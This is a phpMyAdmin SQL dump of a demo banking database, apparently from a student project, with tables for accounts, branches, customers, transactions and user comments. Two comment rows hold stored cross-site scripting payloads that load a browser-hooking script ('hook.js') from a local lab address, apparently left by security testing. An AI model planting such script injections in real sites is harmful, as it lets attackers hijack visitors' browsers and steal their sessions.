-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 14-05-2023 a las 12:09:15
-- Versión del servidor: 10.4.25-MariaDB
-- Versión de PHP: 8.1.10

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `banco_tfg`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `account`
--

CREATE TABLE `account` (
  `acnumber` int(18) NOT NULL,
  `custid` varchar(9) DEFAULT NULL,
  `opening_balance` int(7) DEFAULT NULL,
  `user_phone` varchar(10) NOT NULL,
  `atype` varchar(10) DEFAULT NULL,
  `astatus` varchar(10) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `account`
--

INSERT INTO `account` (`acnumber`, `custid`, `opening_balance`, `user_phone`, `atype`, `astatus`) VALUES
(1, 'C00011', 1000, '', 'Saving', 'Active'),
(2, 'C00002', 1000, '', 'Saving', 'Active'),
(3, 'C00003', 1000, '', 'Saving', 'Active'),
(4, 'C00002', 1000, '', 'Saving', 'Active'),
(5, 'C00006', 1000, '', 'Saving', 'Active'),
(6, 'C00007', 1000, '', 'Saving', 'Suspended'),
(7, 'C00007', 1000, '', 'Saving', 'Active'),
(8, 'C00011', 1000, '', 'Saving', 'Terminated'),
(9, 'C00003', 1000, '', 'Saving', 'Terminated'),
(10, '1234567V', 700, '', 'Saving', 'Active'),
(11, '05464173V', 1200, '', 'Saving', 'Active');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `branch`
--

CREATE TABLE `branch` (
  `bid` varchar(6) NOT NULL,
  `bname` varchar(30) DEFAULT NULL,
  `bcity` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `branch`
--

INSERT INTO `branch` (`bid`, `bname`, `bcity`) VALUES
('B00001', 'Asaf ali road', 'Delhi'),
('B00002', 'New delhi main branch', 'Delhi'),
('B00003', 'Delhi cantt', 'Delhi'),
('B00004', 'Jasola', 'Delhi'),
('B00005', 'Mahim', 'Mumbai'),
('B00006', 'Vile parle', 'Mumbai'),
('B00007', 'Mandvi', 'Mumbai'),
('B00008', 'Jadavpur', 'Kolkata'),
('B00009', 'Kodambakkam', 'Chennai');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `comments`
--

CREATE TABLE `comments` (
  `comentario` varchar(200) NOT NULL,
  `usuario` varchar(50) NOT NULL,
  `email` varchar(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `comments`
--

INSERT INTO `comments` (`comentario`, `usuario`, `email`) VALUES
('<script scr=\"http://10.0.2.15:3000/hook.js\"></script>', 'Sergio', 'a@gmail.com'),
('&lt;script src=”http://10.0.2.15:3000/hook.js”&gt;&lt;/script&gt;), ', 'Sergio', 'a@gmail.com'),
('Este es el mejor banco que he visto nunca. Puedes crear una cuenta en cuestión de segundos y comenzar tu experiencia bancaria online', 'Sergio Crespillo', 'a@gmail.com');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `customer`
--

CREATE TABLE `customer` (
  `identityNumber` varchar(9) NOT NULL,
  `fname` varchar(100) DEFAULT NULL,
  `ltname` varchar(30) DEFAULT NULL,
  `city` varchar(15) DEFAULT NULL,
  `phone` varchar(10) DEFAULT NULL,
  `occupation` varchar(10) DEFAULT NULL,
  `dob` date DEFAULT NULL,
  `password` varchar(100) DEFAULT NULL,
  `filename` varchar(200) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `customer`
--

INSERT INTO `customer` (`identityNumber`, `fname`, `ltname`, `city`, `phone`, `occupation`, `dob`, `password`, `filename`) VALUES
('05464173V', 'Sergio', 'Crespillo', 'Madrid', '658435544', 'estudiante', NULL, '$2y$10$wZf7JBrtFG2cV3pTso5xFuqpZTUZXblJiRGZxFRWPKeb0NBaNMHhG', NULL),
('11223344A', 'Personita', 'PersonaA PersonaB', 'Personita City', '987654321', 'Persona', NULL, '$2y$10$rtHhBEZoWFRnp78OfNg7I.uIzyDVU01qmTtMvEwpkmf3DefhB/nf2', ''),
('1234567V', 'PruebaACC', 'Pruebaa', 'Madrid', '12345678', 'Estudiante', NULL, '$2y$10$fBpETtB6vm5quqMncn4sj.ff4tsqOeecaxaBCMftDvBuDjNKy2lCO', ''),
('123456V', 'Prueba', 'Pruebaa', 'Madrid', '123456678', 'Estudiante', NULL, '$2y$10$Uz2TAztsRdEQyw7melJnXO2wjQ9f0wQ4RXyhObf5KNZgRgdc2yBUm', 'media/icono_perfil.png'),
('C00001', 'Ramesh', 'Sharma', 'Delhi', '9543198345', 'Service', '1976-12-06', 'prueba', ''),
('C00002', 'Avinash', 'Minha', 'Delhi', '9876532109', 'Service', '1974-10-16', NULL, ''),
('C00003', 'Rahul', 'Rastogi', 'Delhi', '9765178901', 'Student', '1981-09-26', NULL, ''),
('C00004', 'Parul', 'Gandhi', 'Delhi', '9876532109', 'Housewife', '1976-11-03', NULL, ''),
('C00005', 'Naveen', 'Aedekar', 'Mumbai', '8976523190', 'Service', '1976-09-19', NULL, ''),
('C00006', 'Chitresh', 'Barwe', 'Mumbai', '7651298321', 'Student', '1992-11-06', NULL, ''),
('C00007', 'Amit', 'Borkar', 'Mumbai', '9875189761', 'Student', '1981-09-06', NULL, ''),
('C00008', 'Nisha', 'Damle', 'Mumbai', '7954198761', 'Service', '1975-12-03', NULL, ''),
('C00009', 'Abhishek', 'Dutta', 'Kolkata', '9856198761', 'Service', '1973-05-22', NULL, ''),
('C00010', 'Shankar', 'Nair', 'Chennai', '8765489076', 'Service', '1976-07-12', NULL, ''),
('C00011', 'Tes', 'Test', 'TestCity', '123456789', 'Tester', NULL, '$2y$10$Ed2COendSQLXKSBB9YGIveOkz/X1pLtdZvRZjgFNYXT/gZ4SF05RG', '');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `loan`
--

CREATE TABLE `loan` (
  `loan_id` int(11) NOT NULL,
  `custid` varchar(9) NOT NULL,
  `bid` varchar(6) NOT NULL,
  `loan_amount` bigint(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `trandetails`
--

CREATE TABLE `trandetails` (
  `tnumber` int(18) NOT NULL,
  `acnumber` int(18) DEFAULT NULL,
  `dot` date DEFAULT NULL,
  `medium_of_transaction` varchar(20) DEFAULT NULL,
  `transaction_amount` int(7) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `trandetails`
--

INSERT INTO `trandetails` (`tnumber`, `acnumber`, `dot`, `medium_of_transaction`, `transaction_amount`) VALUES
(1, 1, '2013-01-01', 'Cheque', 2000),
(2, 1, '2013-02-01', 'Cash', 1000),
(3, 2, '2013-01-01', 'Cash', 2000),
(4, 2, '2013-02-01', 'Cash', 3000),
(5, 7, '2013-01-11', 'Cash', 7000),
(6, 7, '2013-01-13', 'Cash', 9000),
(7, 1, '2013-03-13', 'Cash', 4000),
(8, 1, '2013-03-14', 'Cheque', 3000),
(9, 1, '2013-03-21', 'Cash', 9000),
(10, 1, '2013-03-22', 'Cash', 2000),
(11, 2, '2013-03-25', 'Cash', 7000),
(12, 2, '2013-03-26', 'Cash', 2000),
(13, 10, '2023-04-09', 'Cheque', 100);

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `account`
--
ALTER TABLE `account`
  ADD PRIMARY KEY (`acnumber`),
  ADD KEY `account_custid_fk` (`custid`);

--
-- Indices de la tabla `branch`
--
ALTER TABLE `branch`
  ADD PRIMARY KEY (`bid`);

--
-- Indices de la tabla `customer`
--
ALTER TABLE `customer`
  ADD PRIMARY KEY (`identityNumber`);

--
-- Indices de la tabla `loan`
--
ALTER TABLE `loan`
  ADD PRIMARY KEY (`loan_id`),
  ADD KEY `bid` (`bid`),
  ADD KEY `custid` (`custid`);

--
-- Indices de la tabla `trandetails`
--
ALTER TABLE `trandetails`
  ADD PRIMARY KEY (`tnumber`),
  ADD KEY `trandetails_acnumber_fk` (`acnumber`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `trandetails`
--
ALTER TABLE `trandetails`
  MODIFY `tnumber` int(18) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- Restricciones para tablas volcadas
--

--
-- Filtros para la tabla `account`
--
ALTER TABLE `account`
  ADD CONSTRAINT `account_custid_fk` FOREIGN KEY (`custid`) REFERENCES `customer` (`identityNumber`);

--
-- Filtros para la tabla `loan`
--
ALTER TABLE `loan`
  ADD CONSTRAINT `loan_ibfk_1` FOREIGN KEY (`custid`) REFERENCES `customer` (`identityNumber`),
  ADD CONSTRAINT `loan_ibfk_2` FOREIGN KEY (`bid`) REFERENCES `branch` (`bid`);

--
-- Filtros para la tabla `trandetails`
--
ALTER TABLE `trandetails`
  ADD CONSTRAINT `trandetails_acnumber_fk` FOREIGN KEY (`acnumber`) REFERENCES `account` (`acnumber`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
